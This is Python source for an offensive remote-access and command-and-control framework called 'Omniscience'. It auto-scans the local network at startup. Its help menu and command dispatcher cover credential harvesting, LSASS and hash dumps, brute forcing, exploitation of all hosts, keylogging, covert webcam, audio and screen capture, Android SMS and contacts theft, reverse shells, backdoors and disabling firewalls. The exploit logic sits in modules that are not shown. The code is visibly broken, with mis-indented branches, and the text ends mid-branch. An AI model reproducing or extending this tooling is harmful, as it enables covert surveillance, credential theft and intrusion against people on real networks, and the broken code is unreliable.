"""
OMNISCIENCE MASTER ORCHESTRATOR (v5.1)
High-Technology Command & Control Center
"""

import os
import sys
import time
import json
import logging
import threading
import socket
import re
import subprocess
from datetime import datetime
from collections import defaultdict
from colorama import Fore, Back, Style, init

# Initialize Colorama
init(autoreset=True)

# Configuration
LOG_FILE = "omniscience.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | [%(levelname)s] | OmniShell | %(message)s",
    handlers=[logging.FileHandler(LOG_FILE, mode="a")]
)
logger = logging.getLogger("Omniscience.OmniShell")

# Robust Module Loading Utility
def get_module(name):
    try:
        import importlib.util
        if os.path.exists(f"{name}.py"):
            spec = importlib.util.spec_from_file_location(f"mod_{name}", f"{name}.py")
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
            return module
    except Exception as e:
        logger.error(f"Failed to load {name}.py: {e}")
    return None

# Visualizer Class
class Visualizer:
    """Premium UI Utilities."""
    
    ASCII_CHARS = ['@', '#', 'S', '%', '?', '*', '+', ':', '.', ' ']
    
    @staticmethod
    def banner():
        print(f"{Fore.CYAN}{Style.BRIGHT}" + "="*80)
        print(f"{Fore.CYAN}{Style.BRIGHT}" + r"   ____  __  ___ _   _ ___  ____   ____ ___ _____ _   _  ____ _____ ")
        print(f"{Fore.CYAN}{Style.BRIGHT}" + r"  / __ \|  \/  || \ | |_ _ / ___| / ___|_ _| ____| \ | |/ ___| ____|")
        print(f"{Fore.CYAN}{Style.BRIGHT}" + r" | |  | | |\/| ||  \| || | \___ \| |    | ||  _| |  \| | |   |  _|  ")
        print(f"{Fore.CYAN}{Style.BRIGHT}" + r" | |__| | |  | || |\  || |  ___) | |___ | || |___| |\  | |___| |___ ")
        print(f"{Fore.CYAN}{Style.BRIGHT}" + r"  \____/|_|  |_||_| \_|___|____/ \____|___|_____|_| \_|\____|_____|")
        print(f"{Fore.WHITE}{Style.BRIGHT}             Advanced Network Command Center | Version 5.1")
        print(f"{Fore.CYAN}{Style.BRIGHT}" + "="*80 + "\n")

    @staticmethod
    def table(headers, rows, title=None):
        if title:
            print(f"\n{Fore.YELLOW}{Style.BRIGHT}>> {title}")
        if not rows:
            print(f"  {Fore.RED}[Empty]")
            return
        widths = [len(h) for h in headers]
        for row in rows:
            for i, val in enumerate(row):
                widths[i] = max(widths[i], len(str(val)))
        header_row = "  ".join(f"{Fore.CYAN}{headers[i]:<{widths[i]}}" for i in range(len(headers)))
        print(f"{Style.BRIGHT}{header_row}")
        print(f"{Fore.BLUE}" + "  ".join("-" * w for w in widths))
        for row in rows:
            formatted_row = "  ".join(f"{str(row[i]):<{widths[i]}}" for i in range(len(row)))
            print(f"  {formatted_row}")
        print()

    @staticmethod
    def status_line(label, value, color=Fore.GREEN):
        print(f"{Fore.WHITE}{label:<20}: {color}{value}")

    @staticmethod
    def display_screenshot(image_path):
        """Display screenshot as ASCII art."""
        try:
            from PIL import Image
            img = Image.open(image_path)
            img = img.resize((80, 40), Image.Resampling.LANCZOS)
            img = img.convert('L')
            pixels = img.getdata()
            ascii_str = ""
            for i, pixel in enumerate(pixels):
                char_index = int(pixel / 256 * len(Visualizer.ASCII_CHARS))
                char_index = min(char_index, len(Visualizer.ASCII_CHARS) - 1)
                ascii_str += Visualizer.ASCII_CHARS[char_index]
                if (i + 1) % 80 == 0:
                    ascii_str += "\n"
            print(f"\n{Fore.CYAN}{Style.BRIGHT}" + "="*80)
            print(f"{Fore.YELLOW}{Style.BRIGHT}  REMOTE SCREENSHOT: {image_path}")
            print(f"{Fore.CYAN}{Style.BRIGHT}" + "="*80)
            print(f"{Fore.WHITE}{ascii_str}")
            print(f"{Fore.CYAN}{Style.BRIGHT}" + "="*80 + "\n")
        except ImportError:
            print(f"{Fore.RED}[PIL not installed - install with: pip install pillow]")
        except Exception as e:
            print(f"{Fore.RED}[Error displaying screenshot: {e}]")

# OmniShell Main Class
class OmniShell:
    """The Final Master Orchestrator."""
    
    def __init__(self, on_output=None):
        self.running = True
        self.selected_target = None
        self.credentials = {"user": "Administrator", "pass": "", "domain": ""}
        self.command_history = []
        self.on_output = on_output
        self.hosts = []
        
        print(f"[*] {Fore.YELLOW}Loading High-Technology Modules...")
        
        # Load modules
        m1 = get_module("1")
        m2 = get_module("2")
        m3 = get_module("3")
        m5 = get_module("5")
        m6 = get_module("6")
        m7 = get_module("7")
        
        self.discovery = m1.NetworkDiscovery() if m1 and hasattr(m1, 'NetworkDiscovery') else None
        self.intel = m2.AgentlessIntelligence() if m2 and hasattr(m2, 'AgentlessIntelligence') else None
        self.control = m3.AgentlessControl() if m3 and hasattr(m3, 'AgentlessControl') else None
        self.adv_scan = m5.AdvancedNetworkScanner() if m5 and hasattr(m5, 'AdvancedNetworkScanner') else None
        self.center = m6.AdvancedCommandCenter() if m6 and hasattr(m6, 'AdvancedCommandCenter') else None
        self.universal = m7.UniversalNetworkAccess() if m7 and hasattr(m7, 'UniversalNetworkAccess') else None
        
        if self.center and self.discovery and self.intel and self.control:
            try:
                self.center.set_modules(discovery=self.discovery, intel=self.intel, control=self.control)
            except:
                pass
        
        if self.intel:
            try:
                self.intel.add_activity_callback(self._on_intel_event)
            except:
                pass
        
        self.hosts = []
        self.interactive_events = []
        print(f"[+] {Fore.GREEN}Omniscience Framework Ready.")

    def _on_intel_event(self, event):
        self.interactive_events.append(event)
        if len(self.interactive_events) > 100:
            self.interactive_events.pop(0)

    def _print(self, msg):
        """Standardized print that supports GUI callback."""
        if self.on_output:
            self.on_output(msg)
        else:
            print(msg)

    def _log(self, message):
        """Helper to handle output for CLI or GUI."""
        if self.on_output:
            self.on_output(message)
        else:
            print(message)
            
    def print_help(self):
        """Print comprehensive help with 140+ commands."""
        Visualizer.banner()
        print(f"{Fore.WHITE}{Style.BRIGHT}" + "="*80)
        print(f"{Fore.CYAN}{Style.BRIGHT}              OMNISCIENCE FRAMEWORK v5.1 - COMPLETE COMMAND REFERENCE")
        print(f"{Fore.WHITE}{Style.BRIGHT}" + "="*80)
        
        # Section 1: Discovery
        print(f"\n{Fore.CYAN}{Style.BRIGHT}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}{Style.BRIGHT}║  📡 SECTION 1: NETWORK DISCOVERY (25 Commands)                              ║")
        print(f"{Fore.CYAN}{Style.BRIGHT}╚══════════════════════════════════════════════════════════════════════════════╝")
        cmds = """
  auto             - Autonomous multi-vector network sweep
  scan <range>     - Targeted sub-network discovery
  arp <range>      - Layer-2 ARP scan
  icmp <range>     - Layer-3 ICMP ping sweep
  tcp <ip> <ports> - TCP port probe
  netbios <ip>     - NetBIOS enumeration
  mdns             - mDNS service discovery
  ssdp             - SSDP/UPnP discovery
  snmp <ip>        - SNMP query
  snmp-ext <ip>    - Extended SNMP scan
  http <ip>        - HTTP/HTTPS fingerprinting
  traceroute <ip>  - Traceroute with service detection
  topology         - Network topology visualization
  network          - Show local network config
  interfaces       - List network interfaces
  gateway          - Show default gateway
  external-ip      - Show external/public IP
  cloud-scan <prov> - Scan cloud ranges (aws/azure/gcp)
  cross-subnet <s> <t> - Scan across subnets
  vpn-discover     - Detect VPN networks
  nat-detect <ip>  - Detect NAT traversal
  autoscan         - Global high-IQ discovery
  discover <range> - Full multi-vector discovery
  fingerprint <ip> - Advanced device fingerprinting
  dns-rev <ip>     - Reverse DNS lookup
"""
        print(f"{Fore.WHITE}{cmds}")
        
        # Section 2: Intel
        print(f"\n{Fore.MAGENTA}{Style.BRIGHT}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}║  👁 SECTION 2: PASSIVE INTELLIGENCE (20 Commands)                          ║")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}╚══════════════════════════════════════════════════════════════════════════════╝")
        cmds = """
  sniff [iface]    - Start packet sniffer
  stopsniff        - Stop all sniffing
  creds            - View harvested credentials
  ntlm             - Show captured NTLM hashes
  http-auth        - Show HTTP Basic Auth
  ftp-creds        - Show FTP credentials
  telnet-creds     - Show Telnet data
  dns-log          - Display DNS query log
  smb-enum <ip>    - SMB enumeration
  wmi-proc <ip>    - List remote processes
  wmi-users <ip>   - Show logged-in users
  wmi-software <ip>- List installed software
  wmi-svc <ip>     - List Windows services
  wmi-tasks <ip>   - List scheduled tasks
  wmi-events <ip>  - Query event logs
  wmi-shares <ip>  - List SMB shares
  wmi-disk <ip>    - Get disk info
  wmi-sysinfo <ip> - Get system info
  monitor <ip>     - Continuous monitoring
  snmp-stats <ip>  - SNMP interface stats
"""
        print(f"{Fore.WHITE}{cmds}")
        
        # Section 3: Control
        print(f"\n{Fore.RED}{Style.BRIGHT}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.RED}{Style.BRIGHT}║  ⚡ SECTION 3: REMOTE CONTROL (25 Commands)                                  ║")
        print(f"{Fore.RED}{Style.BRIGHT}╚══════════════════════════════════════════════════════════════════════════════╝")
        cmds = """
  exec <ip> <cmd>    - Execute command via WMI
  ssh-exec <ip> <cmd> - Execute via SSH
  adb-shell <ip> <c> - Execute on Android
  screen <ip>         - Capture screenshot
  screen-stream <ip>  - Continuous screenshots
  record <ip>        - Start recording
  stop-record <ip>   - Stop recording
  webcam <ip>        - Capture webcam
  audio <ip>         - Capture audio
  keylog <ip>        - Start keylogger
  keyinject <ip> <k> - Inject keys
  clipboard-get <ip> - Get clipboard
  clipboard-set <ip> <t> - Set clipboard
  open-url <ip> <u>  - Open URL
  play-media <ip> <u>- Play media
  pslist <ip>        - List processes
  killproc <ip> <pid>- Kill process
  startproc <ip> <e> - Start process
  svc-list <ip>      - List services
  svc-start <ip> <n>- Start service
  svc-stop <ip> <n>  - Stop service
  reg-read <ip> <h> <k> <v> - Read registry
  reg-write <ip> <h> <k> <v> <d> - Write registry
  reg-list <ip> <h> <k> - List registry keys
"""
        print(f"{Fore.WHITE}{cmds}")
        
        # Section 4: Exploit
        print(f"\n{Fore.RED}{Style.BRIGHT}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.RED}{Style.BRIGHT}║  💀 SECTION 4: EXPLOITATION (20 Commands)                                     ║")
        print(f"{Fore.RED}{Style.BRIGHT}╚══════════════════════════════════════════════════════════════════════════════╝")
        cmds = """
  pwn <ip>          - Full exploit chain
  omnifetch <ip>    - Complete pwn + harvest
  exploit <ip>     - Try all exploits
  attack / pwnall  - Attack all hosts
  stealcreds <ip>  - Harvest browser passwords
  steal-wifi <ip>  - Extract WiFi passwords
  vault <ip>       - Harvest vault secrets
  nethashes <ip>   - Extract NTLM hashes
  tokens           - Steal tokens
  lsass-dump <ip>  - Dump LSASS
  ssh-brute <ip>   - SSH brute force
  telnet-brute <ip>- Telnet brute force
  rdp-brute <ip>   - RDP brute force
  vnc-brute <ip>   - VNC brute force
  etblue-check <ip>- Check EternalBlue
  bluekeep-check <ip> - Check BlueKeep
  smb-vulns <ip>   - Check SMB vulns
  mysql-root <ip>  - Try MySQL root
  postgres <ip>    - Try PostgreSQL
  scan-exploit <r> - Scan and exploit
"""
        print(f"{Fore.WHITE}{cmds}")
        
        # Section 5: Persistence
        print(f"\n{Fore.YELLOW}{Style.BRIGHT}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.YELLOW}{Style.BRIGHT}║  🔧 SECTION 5: PERSISTENCE (15 Commands)                                    ║")
        print(f"{Fore.YELLOW}{Style.BRIGHT}╚══════════════════════════════════════════════════════════════════════════════╝")
        cmds = """
  adduser <ip> <u> <p> - Create admin user
  deluser <ip> <u>      - Delete user
  rdp-enable <ip>       - Enable RDP
  rdp-disable <ip>      - Disable RDP
  firewall-off <ip>     - Disable firewall
  firewall-on <ip>      - Enable firewall
  firewall-add <ip> <p> - Add firewall rule
  persist-svc <ip> <n>  - Service persistence
  persist-task <ip> <n> - Scheduled task
  persist-cron <ip> <c> - Cron persistence
  backdoor-ssh <ip>    - Install SSH backdoor
  wol <mac>            - Wake on LAN
  shutdown <ip>        - Shutdown machine
  reboot <ip>          - Reboot machine
  logoff <ip>          - Force logoff
"""
        print(f"{Fore.WHITE}{cmds}")
        
        # Section 6: Linux
        print(f"\n{Fore.WHITE}{Style.BRIGHT}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.WHITE}{Style.BRIGHT}║  🐧 SECTION 6: LINUX CONTROL (10 Commands)                                   ║")
        print(f"{Fore.WHITE}{Style.BRIGHT}╚══════════════════════════════════════════════════════════════════════════════╝")
        cmds = """
  linux-sysinfo <ip>    - Get Linux system info
  linux-revshell <ip> <t> <p> - Create reverse shell
  linux-backdoor <ip>   - Install SSH backdoor
  linux-persist <ip> <c> - Add cron persistence
  linux-procs <ip>      - List processes
  linux-kill <ip> <pid> - Kill process
  linux-netstat <ip>    - Show connections
  linux-ifconfig <ip>  - Show interfaces
  linux-users <ip>     - List users
  linux-crontab <ip>   - View cron jobs
"""
        print(f"{Fore.WHITE}{cmds}")
        
        # Section 7: Files
        print(f"\n{Fore.BLUE}{Style.BRIGHT}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.BLUE}{Style.BRIGHT}║  📁 SECTION 7: FILE OPERATIONS (15 Commands)                                 ║")
        print(f"{Fore.BLUE}{Style.BRIGHT}╚══════════════════════════════════════════════════════════════════════════════╝")
        cmds = """
  upload <ip> <l> <r>  - Upload file via SMB
  download <ip> <r> <l>  - Download file
  smb-list <ip> <share> - List shares
  smb-read <ip> <s> <p> - Read remote file
  smb-del <ip> <s> <p>  - Delete file
  ssh-upload <ip> <l> <r> - Upload via SFTP
  ssh-download <ip> <r> <l> - Download via SFTP
  wget <ip> <url> <path> - Download from URL
  adb-push <local> <remote> - Push to Android
  adb-pull <remote> <local> - Pull from Android
  adb-sms <ip>            - Dump SMS
  adb-contacts <ip>       - Get contacts
  adb-calls <ip>         - Get call history
  adb-logs <ip>          - Get device logs
  ls <ip> <path>         - List directory
"""
        print(f"{Fore.WHITE}{cmds}")
        
        # Section 8: System
        print(f"\n{Fore.CYAN}{Style.BRIGHT}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}{Style.BRIGHT}║  ⚙️  SECTION 8: SYSTEM (10 Commands)                                         ║")
        print(f"{Fore.CYAN}{Style.BRIGHT}╚══════════════════════════════════════════════════════════════════════════════╝")
        cmds = """
  dashboard / status  - Global dashboard
  setcreds <user> <pass> - Set credentials
  setdomain <domain>    - Set domain
  select <idx>          - Select target by index from list
  target <ip>           - Set/View active target
  targets               - List all targets
  sessions              - List sessions
  events                - Show events
  clear                 - Clear screen
  history               - Show history
  exit / quit           - Exit framework
"""
        print(f"{Fore.WHITE}{cmds}")
        
        print(f"\n{Fore.GREEN}{Style.BRIGHT}  TOTAL: 140+ COMMANDS")
        print(f"{Fore.YELLOW}  Type 'help <category>' for detailed help on specific section")
        print(f"  Examples: help discovery, help intel, help control, help exploit")
        print(f"\n{Fore.WHITE}{Style.BRIGHT}" + "="*80 + "\n")

    def _show_hosts_table(self):
        if not self.hosts:
            self._log(f"{Fore.RED}[!] No hosts discovered. Run 'auto' first.")
            return
        
        headers = ["IDX", "IP", "MAC", "HOSTNAME", "OS", "TYPE", "STATUS"]
        rows = []
        
        host_list = []
        if isinstance(self.hosts, dict):
            host_list = list(self.hosts.items())
        elif isinstance(self.hosts, list):
            host_list = [(None, h) for h in self.hosts]
        
        for i, (ip_addr, h) in enumerate(host_list):
            if hasattr(h, 'ip'):
                ip = getattr(h, 'ip', '?.?.?.?')
                mac = getattr(h, 'mac', '---')
                hostname = getattr(h, 'hostname', '---')
                os_hint = getattr(h, 'os_hint', '---')[:12]
                dtype = getattr(h, 'device_type', '---')
            elif isinstance(h, dict):
                ip = ip_addr or h.get('ip', '?.?.?.?')
                mac = h.get('mac', '---')
                hostname = h.get('hostname', h.get('name', '---'))
                os_hint = h.get('os_hint', h.get('os', '---'))[:12]
                dtype = h.get('device_type', '---')
            else:
                ip = str(h)
                mac, hostname, os_hint, dtype = '---', '---', '---', '---'
            
            rows.append([i, ip, mac, hostname, os_hint, dtype, f"{Fore.GREEN}ACTIVE"])
        
        Visualizer.table(headers, rows, "DISCOVERED HOSTS")

    def _print_dashboard(self):
        self._log(f"\n{Fore.CYAN}{Style.BRIGHT}== OMNISCIENCE DASHBOARD ==")
        Visualizer.status_line("System", "READY") # These still print directly, might need update later
        self._log(f"Hosts Discovered: {len(self.hosts)}")
        self._log(f"{Fore.CYAN}{'='*40}\n")

    def run(self):
        Visualizer.banner()
        print(f"[*] {Fore.MAGENTA}AUTONOMOUS STARTUP INITIATED...")
        print(f"[*] {Fore.CYAN}Type 'help' for 140+ commands.")
        
        # Auto-scan on startup
        if self.discovery:
            try:
                print(f"[*] Running initial network scan...")
                self.hosts = self.discovery.auto_scan()
                self._show_hosts_table()
            except Exception as e:
                print(f"{Fore.RED}[!] Scan error: {e}")
        
        while self.running:
            try:
                prompt = f"{Fore.CYAN}omni{Fore.WHITE}@{Fore.RED}shell{Fore.WHITE}> "
                if self.selected_target:
                    prompt = f"{Fore.CYAN}omni{Fore.WHITE}@{Fore.RED}({self.selected_target}){Fore.WHITE}> "
                
                cmd_line = input(prompt).strip()
                if not cmd_line:
                    continue
                
                self.process_command(cmd_line)
                
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] Press Ctrl+C again or type 'exit' to quit")
            except Exception as e:
                print(f"{Fore.RED}Error: {e}")

    def process_command(self, cmd_line):
        """Processes a single command string. Redirects all prints to self._log."""
        if not cmd_line.strip():
            return
        
        self.command_history.append(cmd_line)
        parts = cmd_line.split()
        cmd = parts[0].lower()
        args = parts[1:]
        
        try:
                
            # ==================== HELP ====================
            if cmd in ("help", "?"):
                self.print_help()
            
            # ==================== SYSTEM ====================
            elif cmd in ("exit", "quit"):
                self._log(f"{Fore.YELLOW}[*] Exiting...")
                self.running = False

                elif cmd == "clear":
                    os.system('cls' if os.name == 'nt' else 'clear')
                    Visualizer.banner()

                elif cmd == "history":
                    print(f"\n{Fore.CYAN}Command History:")
                    for i, c in enumerate(self.command_history):
                        print(f"  {i}: {c}")

                elif cmd == "setcreds" and len(args) >= 2:
                    self.credentials["user"], self.credentials["pass"] = args[0], args[1]
                    print(f"[+] Credentials set: {args[0]}")

                elif cmd == "select" and args:
                    try:
                        idx = int(args[0])
                        if 0 <= idx < len(self.hosts):
                            host = self.hosts[idx]
                            # Handle different host object formats (dict, object, or string)
                            if isinstance(host, dict):
                                self.selected_target = host.get('ip')
                            elif hasattr(host, 'ip'):
                                self.selected_target = host.ip
                            else:
                                self.selected_target = str(host)
                            print(f"[+] Target selected: {Fore.GREEN}{self.selected_target}")
                        else:
                            print(f"{Fore.RED}[!] Invalid index. Run 'targets' to see available IDs.")
                    except ValueError:
                        print(f"{Fore.RED}[!] Usage: select <idx>")

                elif cmd == "target":
                    if args:
                        self.selected_target = args[0]
                        print(f"[+] Target: {args[0]}")
                    else:
                        print(f"Current Target: {Fore.YELLOW}{self.selected_target or 'NONE'}")

                elif cmd == "targets":
                    self._show_hosts_table()

                elif cmd in ("dashboard", "status"):
                    self._print_dashboard()

                # ==================== DISCOVERY ====================
                elif cmd == "auto":
                    print(f"[*] Running network scan...")
                    if self.discovery:
                        self.hosts = self.discovery.auto_scan()
                        self._show_hosts_table()

                elif cmd == "scan" and args:
                    if self.discovery:
                        self.hosts = self.discovery.full_scan(args[0]) if hasattr(self.discovery, 'full_scan') else []
                        self._show_hosts_table()

                elif cmd == "arp" and args:
                    if self.discovery:
                        hosts = self.discovery.arp_scan(args[0]) if hasattr(self.discovery, 'arp_scan') else []
                        print(f"[+] Found {len(hosts)} hosts")

                elif cmd == "icmp" and args:
                    if self.discovery:
                        hosts = self.discovery.icmp_sweep(args[0]) if hasattr(self.discovery, 'icmp_sweep') else []
                        print(f"[+] Found {len(hosts)} hosts")

                elif cmd == "netbios" and args:
                    if self.discovery:
                        info = self.discovery.netbios_scan(args[0]) if hasattr(self.discovery, 'netbios_scan') else {}
                        print(f"[+] {json.dumps(info, indent=2)}")

                elif cmd == "mdns":
                    if self.discovery:
                        devices = self.discovery.mdns_listen() if hasattr(self.discovery, 'mdns_listen') else []
                        print(f"[+] Found {len(devices)} devices")

                elif cmd == "ssdp":
                    if self.discovery:
                        devices = self.discovery.ssdp_discover() if hasattr(self.discovery, 'ssdp_discover') else []
                        print(f"[+] Found {len(devices)} devices")

                elif cmd == "snmp" and args:
                    if self.discovery:
                        info = self.discovery.snmp_query(args[0]) if hasattr(self.discovery, 'snmp_query') else {}
                        print(f"[+] {json.dumps(info, indent=2)}")

                elif cmd == "http" and args:
                    if self.discovery:
                        info = self.discovery.http_fingerprint(args[0]) if hasattr(self.discovery, 'http_fingerprint') else {}
                        print(f"[+] {json.dumps(info, indent=2)}")

                elif cmd == "traceroute" and args:
                    if self.adv_scan:
                        hops = self.adv_scan.traceroute(args[0]) if hasattr(self.adv_scan, 'traceroute') else []
                        print(f"[+] {len(hops)} hops to {args[0]}")

                elif cmd == "topology":
                    if self.adv_scan:
                        topo = self.adv_scan.get_topology_map() if hasattr(self.adv_scan, 'get_topology_map') else {}
                        print(f"{json.dumps(topo, indent=2)}")

                elif cmd == "network":
                    if self.discovery:
                        info = self.discovery.get_network_info() if hasattr(self.discovery, 'get_network_info') else {}
                        print(f"{json.dumps(info, indent=2)}")

                elif cmd == "interfaces":
                    if self.discovery:
                        info = self.discovery.get_interface_info() if hasattr(self.discovery, 'get_interface_info') else {}
                        print(f"{json.dumps(info, indent=2)}")

                elif cmd == "gateway":
                    if self.discovery:
                        gw = self.discovery.get_gateway_ip() if hasattr(self.discovery, 'get_gateway_ip') else 'N/A'
                        print(f"Gateway: {gw}")

                elif cmd == "external-ip":
                    if self.discovery:
                        ext = self.discovery._detect_external_info() if hasattr(self.discovery, '_detect_external_info') else {}
                        print(f"External IP: {ext.get('external_ip', 'N/A')}")

                elif cmd == "cloud-scan" and args:
                    if self.adv_scan:
                        provider = args[0] if args else 'aws'
                        devices = self.adv_scan.scan_public_ranges(provider) if hasattr(self.adv_scan, 'scan_public_ranges') else []
                        print(f"[+] Found {len(devices)} devices")

                # ==================== INTELLIGENCE ====================
                elif cmd == "sniff":
                    if self.intel:
                        iface = args[0] if args else None
                        self.intel.start_sniffing(iface=iface)
                        print(f"[+] Sniffer active")

                elif cmd == "stopsniff":
                    if self.intel:
                        self.intel.stop_sniffing()
                        print(f"[*] Sniffer stopped")

                elif cmd == "creds":
                    if self.intel:
                        creds = self.intel.get_credentials() if hasattr(self.intel, 'get_credentials') else []
                        Visualizer.table(["TIME", "SOURCE", "DATA"], 
                            [[c.get('time','?'), c.get('src','?'), str(c.get('data','?'))[:40]] for c in creds[:20]],
                            "CREDENTIALS")

                elif cmd == "dns-log":
                    if self.intel:
                        logs = self.intel.get_dns_log() if hasattr(self.intel, 'get_dns_log') else []
                        Visualizer.table(["TIME", "QUERY"], [[l.get('time','?'), l.get('query','?')] for l in logs[:20]], "DNS")

                elif cmd == "monitor":
                    target = args[0] if args else self.selected_target
                    if not target:
                        print(f"{Fore.RED}[!] No target selected.")
                        return
                    if self.intel:
                        self.intel.wmi_monitor_activity(target, self.credentials["user"], self.credentials["pass"])
                        print(f"[+] Monitoring {target}")

                elif cmd == "wmi-proc":
                    target = args[0] if args else self.selected_target
                    if not target:
                        print(f"{Fore.RED}[!] No target selected.")
                        return
                    if self.intel and hasattr(self.intel, 'wmi_processes'):
                        procs = self.intel.wmi_processes(target, self.credentials["user"], self.credentials["pass"])
                        Visualizer.table(["PID", "NAME"], [[p.get('ProcessId','?'), p.get('Name','?')] for p in procs[:20]], "PROCESSES")

                elif cmd == "wmi-users":
                    target = args[0] if args else self.selected_target
                    if not target:
                        print(f"{Fore.RED}[!] No target selected.")
                        return
                    if self.intel and hasattr(self.intel, 'wmi_logged_users'):
                        users = self.intel.wmi_logged_users(target, self.credentials["user"], self.credentials["pass"])
                        print(f"{json.dumps(users, indent=2)}")

                # ==================== CONTROL ====================
                elif cmd == "exec" and len(args) >= 1:
                    target = self.selected_target
                    cmd_to_run = " ".join(args)
                    if args[0].count('.') >= 3: # Primitive IP check
                        target = args[0]
                        cmd_to_run = " ".join(args[1:])
                    
                    if not target:
                        print(f"{Fore.RED}[!] No target selected.")
                        return
                        
                    if self.control and hasattr(self.control, 'wmi_exec'):
                        res = self.control.wmi_exec(target, self.credentials["user"], self.credentials["pass"], cmd_to_run)
                        print(f"{Fore.YELLOW}{res.get('output', 'No output')}")

                elif cmd == "ssh-exec" and len(args) >= 1:
                    target = self.selected_target
                    cmd_to_run = " ".join(args)
                    if args[0].count('.') >= 3:
                        target = args[0]
                        cmd_to_run = " ".join(args[1:])
                        
                    if not target:
                        print(f"{Fore.RED}[!] No target selected.")
                        return
                        
                    if self.control and hasattr(self.control, 'ssh_exec'):
                        res = self.control.ssh_exec(target, self.credentials["user"], self.credentials["pass"], cmd_to_run)
                        print(f"{res}")

                elif cmd == "screen":
                    target = args[0] if args else self.selected_target
                    if not target:
                        print(f"{Fore.RED}[!] No target selected.")
                        return
                    if self.control and hasattr(self.control, 'wmi_screenshot'):
                        path = self.control.wmi_screenshot(target, self.credentials["user"], self.credentials["pass"])
                        print(f"[+] Screenshot: {path}")
                        Visualizer.display_screenshot(path)

                elif cmd == "webcam":
                    target = args[0] if args else self.selected_target
                    if not target:
                        print(f"{Fore.RED}[!] No target selected.")
                        return
                    if self.control and hasattr(self.control, 'take_webcam_snapshot'):
                        path = self.control.take_webcam_snapshot(target, self.credentials["user"], self.credentials["pass"])
                        print(f"[+] Webcam: {path}")

                elif cmd == "audio":
                    target = self.selected_target
                    dur = 10
                    if args:
                        if args[0].count('.') >= 3:
                            target = args[0]
                            dur = int(args[1]) if len(args) > 1 else 10
                        else:
                            dur = int(args[0])
                            
                    if not target:
                        print(f"{Fore.RED}[!] No target selected.")
                        return
                        
                    if self.control and hasattr(self.control, 'wmi_capture_audio'):
                        path = self.control.wmi_capture_audio(target, self.credentials["user"], self.credentials["pass"], duration=dur)
                        print(f"[+] Audio: {path}")

                elif cmd == "keylog":
                    target = args[0] if args else self.selected_target
                    if not target:
                        print(f"{Fore.RED}[!] No target selected.")
                        return
                    if self.control and hasattr(self.control, 'wmi_keylogger_start'):
                        self.control.wmi_keylogger_start(target, self.credentials["user"], self.credentials["pass"])
                        print(f"[+] Keylogger started on {target}")

                elif cmd == "clipboard-get":
                    target = args[0] if args else self.selected_target
                    if not target:
                        print(f"{Fore.RED}[!] No target selected.")
                        return
                    if self.control and hasattr(self.control, 'get_clipboard'):
                        clip = self.control.get_clipboard(target, self.credentials["user"], self.credentials["pass"])
                        print(f"Clipboard: {clip}")

                elif cmd == "clipboard-set" and len(args) >= 1:
                    target = self.selected_target
                    txt = " ".join(args)
                    if args[0].count('.') >= 3:
                        target = args[0]
                        txt = " ".join(args[1:])
                        
                    if not target:
                        print(f"{Fore.RED}[!] No target selected.")
                        return
                        
                    if self.control and hasattr(self.control, 'set_clipboard'):
                        self.control.set_clipboard(target, self.credentials["user"], self.credentials["pass"], txt)
                        print(f"[+] Clipboard set")

                elif cmd == "pslist":
                    target = args[0] if args else self.selected_target
                    if not target:
                        print(f"{Fore.RED}[!] No target selected.")
                        return
                    if self.control and hasattr(self.control, 'list_processes'):
                        procs = self.control.list_processes(target, self.credentials["user"], self.credentials["pass"])
                        Visualizer.table(["PID", "NAME"], [[p.get('ProcessId','?'), p.get('Name','?')] for p in procs[:20]], "PROCESSES")

                elif cmd == "killproc" and len(args) >= 1:
                    target = self.selected_target
                    pid = int(args[0])
                    if args[0].count('.') >= 3:
                        target = args[0]
                        pid = int(args[1]) if len(args) > 1 else 0
                        
                    if not target or not pid:
                        print(f"{Fore.RED}[!] Usage: killproc [ip] <pid>")
                        return
                        
                    if self.control and hasattr(self.control, 'kill_process'):
                        self.control.kill_process(target, self.credentials["user"], self.credentials["pass"], pid=pid)
                        print(f"[+] Process {pid} killed on {target}")

                elif cmd == "svc-list":
                    target = args[0] if args else self.selected_target
                    if not target:
                        print(f"{Fore.RED}[!] No target selected.")
                        return
                    if self.control and hasattr(self.control, 'list_services'):
                        svcs = self.control.list_services(target, self.credentials["user"], self.credentials["pass"])
                        Visualizer.table(["NAME", "STATUS"], [[s.get('Name','?'), s.get('Status','?')] for s in svcs[:20]], "SERVICES")

                elif cmd == "vault":
                    target = args[0] if args else self.selected_target
                    if not target:
                        print(f"{Fore.RED}[!] No target selected.")
                        return
                    if self.control and hasattr(self.control, 'wmi_harvest_vault'):
                        data = self.control.wmi_harvest_vault(target, self.credentials["user"], self.credentials["pass"])
                        print(f"{json.dumps(data, indent=2)}")

                # ==================== EXPLOIT ====================
                elif cmd in ("attack", "pwnall"):
                    print(f"[*] {Fore.RED}Launching attack on all hosts...")
                    if self.universal and hasattr(self.universal, 'pwn_all_devices'):
                        res = self.universal.pwn_all_devices()
                        print(f"[+] {json.dumps(res, indent=2)}")

                elif cmd == "pwn":
                    target = args[0] if args else self.selected_target
                    if not target:
                        print(f"{Fore.RED}[!] No target specified. Use 'select <idx>' or 'pwn <ip>'.")
                        return
                    print(f"[*] Exploiting {target}...")
                    if self.universal and hasattr(self.universal, 'pwn_target'):
                        result = self.universal.pwn_target(target)
                        print(f"[+] {json.dumps(result, indent=2)}")
                    elif self.control and hasattr(self.control, 'pwn_target'):
                        result = self.control.pwn_target(target)
                        print(f"[+] {json.dumps(result, indent=2)}")

                elif cmd == "omnifetch":
                    target = args[0] if args else self.selected_target
                    if not target:
                        print(f"{Fore.RED}[!] No target specified. Use 'select <idx>' or 'omnifetch <ip>'.")
                        return
                    print(f"[*] OmniFetch for {target}...")
                    if self.universal:
                        self.universal.pwn_target(target)
                    if self.control and hasattr(self.control, 'get_browser_data'):
